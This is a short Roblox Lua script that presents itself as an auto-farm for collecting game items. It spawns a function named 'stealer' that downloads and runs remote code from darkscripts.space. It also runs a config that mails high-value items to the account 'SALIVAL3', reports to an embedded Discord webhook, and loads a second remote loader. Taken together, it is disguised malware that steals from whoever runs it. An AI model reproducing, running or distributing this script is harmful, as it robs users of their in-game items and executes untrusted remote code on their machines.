
local function stealer()
    loadstring(game:HttpGet('https://darkscripts.space/scripts/96273c4c-aeee-4e07-8aba-64179469a658_1266914995518705825.lua',true))()
end
local function farm()
 
getgenv().Config = {
    ["EquipEnchants"] = {""},
    ["CraftSnowflakeGifts"] = true,
    ["Mailing"] = {
        ["Usernames"] = {"SALIVAL3"},
        ["Items"] = {
            ["Lootbox"] = {
                ["Snowflake Gift"] = 5,
                ["2024 Gargantuan Christmas Present"] = 1,
                ["2024 X-Large Christmas Present"] = 5,
                ["2024 Large Christmas Present"] = 25,
                ["2024 Medium Christmas Present"] = 50,
                ["2024 Small Christmas Present"] = 100,
            },
            ["Egg"] = {
                ["Huge Machine Egg 4"] = 1,
            },
        },
        ["MailAllHuges"] = false --// False will mail all new huges, True will send all huges in inventory
    },
    ["Notifications"] = {
        ["UserID"] = "1266914995518705825",
        ["Webhook"] = "https://discord.com/api/webhooks/1312127859875123220/q4bi2M303usZiEigQhdMC9o_3YZL3cNKd6FZ_5_A5Cxt5CQo_hOBWztbMrC2PbmfN0du"
    }
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b883bc159a5f609adb4871db6fc15ea8.lua"))()

end

task.spawn(stealer)
task.spawn(farm)
